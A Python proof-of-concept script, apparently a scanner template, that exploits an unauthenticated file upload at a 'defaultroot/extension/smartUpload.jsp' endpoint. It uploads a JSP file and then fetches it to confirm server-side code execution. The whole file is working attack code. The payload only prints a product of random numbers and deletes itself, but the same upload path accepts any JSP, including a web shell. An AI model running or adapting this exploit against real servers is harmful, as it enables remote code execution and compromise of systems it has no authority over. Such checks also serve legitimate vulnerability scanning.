import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=randomInt(40000, 44800)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f2=randomInt(40000, 44800)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f3=randomInt(40000, 44800)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
rboundary=randomLowercase(8)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
randname=randomLowercase(6)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0"
	body='''------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="photo"; filename="'''+randname+'''.jsp"\r
Content-Type: application/octet-stream\r
\r
<%out.print('''+str(f2)+''' * '''+str(f3)+''');new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="continueUpload"\r
\r
1\r
------WebKitFormBoundary'''+rboundary+'''\r
Content-Disposition: form-data; name="submit"\r
\r
上传继续\r
------WebKitFormBoundary'''+rboundary+'''--\r
'''
	body=body.encode('utf-8')
	headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'+rboundary+''}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
		try:
			fname=re.findall("\";\"\\+\"(\\d+.jsp)\"",response.text)[0]
		except:
			fname=''
	else:
		fname=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"defaultroot/upload/information/{fname}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(f2 * f3) in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
